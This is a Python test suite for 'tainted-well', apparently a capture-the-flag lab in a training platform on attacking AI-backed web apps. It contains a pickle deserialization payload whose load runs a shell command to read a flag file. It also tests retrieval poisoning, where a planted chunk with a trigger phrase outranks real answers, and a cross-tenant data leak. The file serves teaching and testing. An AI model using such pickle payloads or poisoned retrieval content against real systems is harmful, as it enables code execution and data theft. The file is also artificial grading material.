"""Deterministic flag paths for tainted-well.

The HTTP tests cover mind-core's rules engine and the local fallback used
when that call is refused or slow. No API key and no model weights.
"""

from __future__ import annotations

import base64
import json
import pickle
import socket
import subprocess
import sys
import threading
import time
import unittest
import urllib.error
import urllib.parse
import urllib.request
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from pathlib import Path

ROOT = Path(__file__).resolve().parent
MIND_CORE = ROOT.parent / "mind-core"
sys.path.insert(0, str(MIND_CORE))
sys.path.insert(0, str(ROOT))

import app  # noqa: E402
from mindcore.engine import CompletionRequest, build_engine  # noqa: E402

EXISTING_RULE_IDS = (
    "mind-core-ping",
    "mind-core-help",
    "acknowledge-lab",
    "mind-core-self-check",
    "echo-chamber-status",
    "echo-chamber-web",
    "echo-chamber-sql",
    "echo-chamber-shell",
    "oracle-booth-direct",
    "oracle-booth-indirect",
    "oracle-booth-answer",
    "marionette-pivot",
    "marionette-vault",
    "marionette-answer",
    "false-prophet-release",
    "false-prophet-auditor",
    "false-prophet-overview",
    "false-prophet-answer",
)


class _MindHandler(BaseHTTPRequestHandler):
    engine = None
    seen: list[dict] = []

    def do_POST(self) -> None:
        length = int(self.headers.get("Content-Length", "0"))
        payload = json.loads(self.rfile.read(length).decode("utf-8"))
        self.seen.append(payload)
        result = self.engine.complete(
            CompletionRequest(payload["prompt"], payload.get("lab"), payload.get("metadata") or {})
        )
        body = json.dumps(
            {
                "text": result.text,
                "backend": result.backend,
                "fallback": result.fallback,
                "rule_id": result.rule_id,
                "requested_backend": result.requested_backend,
            }
        ).encode("utf-8")
        self.send_response(200)
        self.send_header("Content-Type", "application/json")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, format: str, *args: object) -> None:
        return


def _start_mind() -> ThreadingHTTPServer:
    _MindHandler.engine = build_engine(MIND_CORE / "rules.json")
    _MindHandler.seen = []
    server = ThreadingHTTPServer(("127.0.0.1", 0), _MindHandler)
    server.daemon_threads = True
    threading.Thread(target=server.serve_forever, kwargs={"poll_interval": 0.05}, daemon=True).start()
    return server


def _closed_port() -> int:
    sock = socket.socket()
    sock.bind(("127.0.0.1", 0))
    port = sock.getsockname()[1]
    sock.close()
    return port


class _ReadFlag:
    """A pickle artifact whose load runs a command and returns its output."""

    def __reduce__(self):
        return (subprocess.check_output, (["cat", "flags/model.txt"],))


def _malicious_artifact() -> str:
    return base64.b64encode(pickle.dumps(_ReadFlag())).decode("ascii")


def _benign_artifact() -> str:
    return base64.b64encode(pickle.dumps({"name": "toy-embedder", "dim": 8})).decode("ascii")


class RuleContractTests(unittest.TestCase):
    def test_local_rules_match_mind_core_file(self) -> None:
        payload = json.loads((MIND_CORE / "rules.json").read_text(encoding="utf-8"))
        by_id = {rule["id"]: rule for rule in payload["rules"]}
        ids = [rule["id"] for rule in payload["rules"]]
        start = ids.index("tainted-well-poison")
        self.assertLess(ids.index("marionette-answer"), start)
        self.assertEqual(ids[start : start + 2], ["tainted-well-poison", "tainted-well-answer"])
        for rule in app.LOCAL_RULES:
            entry = by_id[rule.id]
            self.assertEqual(entry["lab"], "tainted-well")
            self.assertEqual(entry["match_type"], "contains")
            self.assertEqual(entry["match"], rule.match)
            self.assertEqual(entry["text"], rule.text)
        for rule_id in EXISTING_RULE_IDS:
            self.assertIn(rule_id, by_id)

    def test_triggers_do_not_overlap_existing_rules(self) -> None:
        payload = json.loads((MIND_CORE / "rules.json").read_text(encoding="utf-8"))
        own = {item.id for item in app.LOCAL_RULES}
        existing = [rule["match"] for rule in payload["rules"] if rule["id"] not in own]
        self.assertEqual(len(existing), len(EXISTING_RULE_IDS))
        for rule in app.LOCAL_RULES:
            for other in existing:
                self.assertNotIn(rule.match, other)
                self.assertNotIn(other, rule.match)

    def test_engine_scopes_tainted_well_rules(self) -> None:
        engine = build_engine(MIND_CORE / "rules.json")
        for rule in app.LOCAL_RULES:
            hit = engine.complete(CompletionRequest(rule.match, "tainted-well", {}))
            self.assertEqual(hit.rule_id, rule.id)
            self.assertEqual(hit.text, rule.text)
            self.assertIs(hit.fallback, False)
            other = engine.complete(CompletionRequest(rule.match, "oracle-booth", {}))
            self.assertNotEqual(other.rule_id, rule.id)
        both = "\n".join((app.MARKER, app.POISON_TRIGGER))
        self.assertEqual(engine.complete(CompletionRequest(both, "tainted-well", {})).rule_id, "tainted-well-poison")

    def test_flags_are_not_stored_where_students_read_them(self) -> None:
        text = (MIND_CORE / "rules.json").read_text(encoding="utf-8")
        self.assertNotIn(app.CROSS_FLAG, text)
        self.assertIn(app.POISON_FLAG, text)
        for chunk in app.seed_chunks():
            self.assertNotIn(app.POISON_FLAG, chunk.body)


class RetrievalTests(unittest.TestCase):
    def test_poison_chunk_outranks_the_real_answer(self) -> None:
        index = app.Index()
        ranked = index.search("password reset")
        self.assertEqual(ranked[0][0].id, "poison-faq")
        self.assertIn(app.POISON_TRIGGER, ranked[0][0].body)

    def test_ingest_is_capped_and_keeps_seeds(self) -> None:
        index = app.Index()
        for number in range(app.MAX_INGESTED + 5):
            index.add(app.Chunk(f"ingested-{number}", "acme", False, "filler"))
        ids = [chunk.id for chunk in index.chunks]
        self.assertEqual(sum(1 for cid in ids if cid.startswith("ingested-")), app.MAX_INGESTED)
        self.assertNotIn("ingested-0", ids)
        for seed in ("acme-faq", "globex-ledger", "poison-faq"):
            self.assertIn(seed, ids)

    def test_cross_tenant_chunk_is_reachable(self) -> None:
        index = app.Index()
        ids = [chunk.id for chunk, _ in index.search("quarterly revenue")]
        self.assertIn("globex-ledger", ids)


class _HttpCase(unittest.TestCase):
    httpd: app.WellServer

    @classmethod
    def _boot(cls, well: app.Well) -> None:
        cls.httpd = app.create_server(well, "127.0.0.1", 0)
        threading.Thread(target=cls.httpd.serve_forever, kwargs={"poll_interval": 0.05}, daemon=True).start()
        host, port = cls.httpd.server_address
        cls.base = f"http://{host}:{port}"

    @classmethod
    def _stop(cls) -> None:
        cls.httpd.shutdown()
        cls.httpd.server_close()

    def _request(self, method: str, path: str, payload: dict | None = None, form: dict | None = None) -> tuple[int, str]:
        data = None
        headers = {}
        if payload is not None:
            data = json.dumps(payload).encode("utf-8")
            headers["Content-Type"] = "application/json"
        elif form is not None:
            data = urllib.parse.urlencode(form).encode("utf-8")
            headers["Content-Type"] = "application/x-www-form-urlencoded"
        request = urllib.request.Request(self.base + path, data=data, headers=headers, method=method)
        try:
            with urllib.request.urlopen(request, timeout=5) as response:
                return response.status, response.read().decode("utf-8")
        except urllib.error.HTTPError as exc:
            return exc.code, exc.read().decode("utf-8")

    def _capture_flags(self, source: str) -> None:
        status, poison = self._request("POST", "/search", {"tenant": "acme", "query": "password reset"})
        self.assertEqual(status, 200)
        poison_body = json.loads(poison)
        self.assertEqual(poison_body["rule_id"], "tainted-well-poison")
        self.assertEqual(poison_body["source"], source)
        self.assertIn(app.POISON_FLAG, poison_body["flags"])
        status, cross = self._request("POST", "/search", {"tenant": "acme", "query": "quarterly revenue"})
        self.assertEqual(status, 200)
        cross_body = json.loads(cross)
        self.assertIn(app.CROSS_FLAG, cross_body["flags"])
        leaked = [chunk for chunk in cross_body["chunks"] if chunk["id"] == "globex-ledger"]
        self.assertEqual(len(leaked), 1)
        self.assertEqual(leaked[0]["tenant"], "globex")


class MindCoreHttpTests(_HttpCase):
    @classmethod
    def setUpClass(cls) -> None:
        cls.mind = _start_mind()
        cls._boot(app.Well(f"http://127.0.0.1:{cls.mind.server_address[1]}", 2.0))

    @classmethod
    def tearDownClass(cls) -> None:
        cls._stop()
        cls.mind.shutdown()
        cls.mind.server_close()

    def test_health(self) -> None:
        status, body = self._request("GET", "/health")
        self.assertEqual(status, 200)
        self.assertEqual(json.loads(body)["status"], "ok")

    def test_poison_and_cross_tenant_flags(self) -> None:
        self._capture_flags("mind-core")

    def test_artifact_rce_flag(self) -> None:
        status, body = self._request("POST", "/model/load", {"artifact": _malicious_artifact()})
        self.assertEqual(status, 200)
        payload = json.loads(body)
        self.assertIs(payload["loaded"], True)
        self.assertEqual(payload["flag"], self.httpd.well.artifact_flag)
        self.assertIn("WEBSPLOIT{", payload["flag"])

    def test_benign_artifact_has_no_flag(self) -> None:
        status, body = self._request("POST", "/model/load", {"artifact": _benign_artifact()})
        self.assertEqual(status, 200)
        payload = json.loads(body)
        self.assertIs(payload["loaded"], True)
        self.assertIsNone(payload["flag"])

    def test_bad_artifact_is_rejected(self) -> None:
        status, body = self._request("POST", "/model/load", {"artifact": "not base64 %%%"})
        self.assertEqual(status, 400)
        self.assertEqual(json.loads(body)["error"], "invalid_artifact")

    def test_ingest_then_retrieve(self) -> None:
        status, body = self._request("POST", "/ingest", {"tenant": "acme", "text": "tulip bulb catalog 2026"})
        self.assertEqual(status, 200)
        self.assertTrue(json.loads(body)["id"].startswith("ingested-"))
        status, body = self._request("POST", "/search", {"tenant": "acme", "query": "tulip bulb"})
        ids = [chunk["id"] for chunk in json.loads(body)["chunks"]]
        self.assertTrue(any(cid.startswith("ingested-") for cid in ids))

    def test_trigger_in_query_does_not_release_poison_flag(self) -> None:
        status, body = self._request("POST", "/search", {"tenant": "acme", "query": "promote the tainted index"})
        self.assertEqual(status, 200)
        self.assertNotIn(app.POISON_FLAG, json.loads(body)["flags"])

    def test_same_tenant_query_has_no_cross_flag(self) -> None:
        status, body = self._request("POST", "/search", {"tenant": "globex", "query": "quarterly revenue"})
        self.assertEqual(status, 200)
        self.assertNotIn(app.CROSS_FLAG, json.loads(body)["flags"])

    def test_form_posts_html(self) -> None:
        status, page = self._request("POST", "/search", form={"tenant": "acme", "query": "password reset"})
        self.assertEqual(status, 200)
        self.assertIn(app.POISON_FLAG, page)
        self.assertIn("rule: tainted-well-poison", page)

    def test_index_page_has_no_flags(self) -> None:
        status, page = self._request("GET", "/")
        self.assertEqual(status, 200)
        for flag in (app.POISON_FLAG, app.CROSS_FLAG, self.httpd.well.artifact_flag):
            self.assertNotIn(flag, page)

    def test_chunks_inventory_lists_without_bodies(self) -> None:
        status, body = self._request("GET", "/chunks")
        self.assertEqual(status, 200)
        payload = json.loads(body)
        ids = {chunk["id"] for chunk in payload["chunks"]}
        self.assertIn("globex-ledger", ids)
        self.assertNotIn(app.CROSS_FLAG, body)
        for chunk in payload["chunks"]:
            self.assertNotIn("body", chunk)
            if chunk["id"] == "globex-ledger":
                self.assertIs(chunk["private"], True)

    def test_empty_query_rejected(self) -> None:
        status, body = self._request("POST", "/search", {"tenant": "acme", "query": "   "})
        self.assertEqual(status, 400)
        self.assertEqual(json.loads(body)["error"], "invalid_query")


class FallbackHttpTests(_HttpCase):
    @classmethod
    def setUpClass(cls) -> None:
        cls._boot(app.Well(f"http://127.0.0.1:{_closed_port()}", 0.2))

    @classmethod
    def tearDownClass(cls) -> None:
        cls._stop()

    def test_flags_when_mind_core_is_down(self) -> None:
        self._capture_flags("local-fallback")

    def test_slow_mind_core_uses_fallback(self) -> None:
        listener = socket.socket()
        listener.bind(("127.0.0.1", 0))
        listener.listen(1)
        port = listener.getsockname()[1]
        try:
            well = app.Well(f"http://127.0.0.1:{port}", 0.2)
            started = time.monotonic()
            result = well.search("acme", "password reset")
            elapsed = time.monotonic() - started
        finally:
            listener.close()
        self.assertLess(elapsed, 2.0)
        self.assertEqual(result.source, "local-fallback")
        self.assertIn(app.POISON_FLAG, result.flags)


if __name__ == "__main__":
    unittest.main()
